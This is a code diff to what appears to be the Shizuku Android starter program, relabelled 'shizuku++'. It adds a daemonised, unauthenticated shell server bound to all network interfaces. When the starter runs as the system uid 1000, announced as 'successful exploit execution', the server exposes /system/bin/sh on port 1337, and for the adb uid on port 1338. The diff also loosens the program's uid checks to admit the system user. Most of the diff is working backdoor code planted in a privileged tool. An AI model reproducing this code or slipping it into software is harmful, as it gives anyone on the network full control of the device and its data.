@@ -11,11 +11,17 @@
 #include <cerrno>
 #include <string>
 #include <termios.h>
+#include <sys/wait.h>
+#include <asm-generic/fcntl.h>
+#include <fstream>
 #include "android.h"
 #include "misc.h"
 #include "selinux.h"
 #include "cgroup.h"
 #include "logging.h"
+#include <linux/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 
 #ifdef DEBUG
 #define JAVA_DEBUGGABLE
@@ -112,8 +118,127 @@ v_current = (uintptr_t) v + v_size - sizeof(char *); \
     }
 }
 
+static int switch_cgroup();
+
+void redirectStd(int old_fd) {
+    dup2(old_fd, STDIN_FILENO);
+    dup2(old_fd, STDOUT_FILENO);
+    dup2(old_fd, STDERR_FILENO);
+}
+
+static int fork_daemon(int returnParent) {
+    pid_t child = fork();
+    if (child < 0)
+        return -1;
+
+    if (child > 0) {
+        int status;
+        pid_t waited = waitpid(child, &status, 0);
+        if (waited == child && WIFEXITED(status)) {
+            if (!returnParent)
+                exit(EXIT_SUCCESS);
+        }
+        return -1;
+    }
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    int devNull = open("/dev/null", O_RDWR);
+    redirectStd(devNull);
+    close(devNull);
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    child = fork();
+    if (child < 0)
+        exit(EXIT_FAILURE);
+
+    if (child > 0)
+        exit(EXIT_SUCCESS);
+
+    uid_t uid = getuid();
+    if (uid == 0 || uid == 1000)
+        switch_cgroup();
+
+    return 0;
+}
+
+void startReverseShell(int port) {
+    int server_fd, client_fd;
+    struct sockaddr_in server_addr{};
+
+    if (fork_daemon(0) < 0) {
+        LOGE("Failed to daemonize");
+        return;
+    }
+
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        LOGE("socket failed");
+        return;
+    }
+
+    int optval = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    //server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  //  inet_addr("127.0.0.1");
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);         //  inet_addr("0.0.0.0");
+    server_addr.sin_port = htons(port);
+
+    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        LOGE("bind failed");
+        close(server_fd);
+        return;
+    }
+
+    if (listen(server_fd, 1) < 0) {
+        LOGE("listen failed");
+        close(server_fd);
+        return;
+    }
+
+    while (true) {
+        client_fd = accept(server_fd, nullptr, nullptr);
+        if (client_fd < 0) {
+            sleep(1);
+            continue;
+        }
+
+        pid_t shell_pid = fork();
+        if (shell_pid < 0) {
+            close(client_fd);
+            continue;
+        }
+
+        if (shell_pid == 0) {
+            close(server_fd);
+
+            redirectStd(client_fd);
+            close(client_fd);
+
+            //execl("/bin/sh", "sh", NULL);
+            execl("/system/bin/sh", "sh", NULL);
+            _exit(1);
+        }
+
+        close(client_fd);
+        waitpid(shell_pid, nullptr, 0);
+    }
+}
+
 static void start_server(const char *path, const char *main_class, const char *process_name) {
-    int fds[2];
+    if (fork_daemon(0) == 0) {
+        for (int i = 0; i < 16; i++) {
+            run_server(path, main_class, process_name);
+            usleep(16000);
+        }
+    }
+
+    /*int fds[2];
     if (pipe(fds) < 0) {
         perrorf("fatal: can't create pipe\n");
         exit(EXIT_FATAL_FORK);
@@ -137,7 +262,7 @@ static void start_server(const char *path, const char *main_class, const char *p
                 dup2(fd, STDERR_FILENO);
                 if (fd > 2) close(fd);
             }
-            
+
             char ready = 1;
             write(fds[1], &ready, 1);
             close(fds[1]);
@@ -154,7 +279,13 @@ static void start_server(const char *path, const char *main_class, const char *p
             printf("info: shizuku_starter exit with 0\n");
             exit(EXIT_SUCCESS);
         }
-    }
+    }*/
+
+    pid_t pid = fork();
+    printf("info: shizuku_server pid is %d\n", pid);
+    printf("info: shizuku_starter exit with 0\n");
+    exit(EXIT_SUCCESS);
+
 }
 
 static int check_selinux(const char *s, const char *t, const char *c, const char *p) {
@@ -206,16 +337,17 @@ int main(int argc, char *argv[]) {
     }
 
     uid_t uid = getuid();
-    if (uid != 0 && uid != 2000) {
-        perrorf("fatal: run Shizuku from non root nor adb user (uid=%d).\n", uid);
+    //if (uid != 0 && uid != 2000) {
+    if (uid != 0 && uid != 1000 && uid != 2000) {
+        //perrorf("fatal: run Shizuku from non root nor adb user (uid=%d).\n", uid);
+        perrorf("fatal: run Shizuku from non root/system/adb user (uid=%d).\n", uid);
         exit(EXIT_FATAL_UID);
     }
 
     se::init();
 
-    if (uid == 0) {
-        switch_cgroup();
-
+    //if (uid == 0) {
+    if (uid == 0 || uid == 1000) {
         if (android_get_device_api_level() >= 29) {
             printf("info: switching mount namespace to init...\n");
             switch_mnt_ns(1);
@@ -238,6 +370,15 @@ int main(int argc, char *argv[]) {
             se::freecon(context);
         }
     }
+
+    printf("-------------------------------------\n");
+    fflush(stdout);
+
+    printf("info: shizuku++ </simplythebest/>\n");
+    fflush(stdout);
+
+    printf("-------------------------------------\n\n");
+    fflush(stdout);
 
     printf("info: starter begin\n");
     fflush(stdout);
@@ -264,6 +405,23 @@ int main(int argc, char *argv[]) {
             printf("warn: failed to kill %d (%s)\n", pid, name);
         }
     });
+
+    if (uid == 1000) {
+        printf("info: successful exploit execution\n");
+        printf("info: starting reverse system shell server at port 1337\n");
+        fflush(stdout);
+        if (fork() == 0) {
+            startReverseShell(1337);
+            _exit(0);
+        }
+    } else if (uid == 2000) {
+        printf("info: starting reverse adb shell server at port 1338\n");
+        fflush(stdout);
+        if (fork() == 0) {
+            startReverseShell(1338);
+            _exit(0);
+        }
+    }
 
     if (access(apk_path.c_str(), R_OK) == 0) {
         printf("info: use apk path from argv\n");
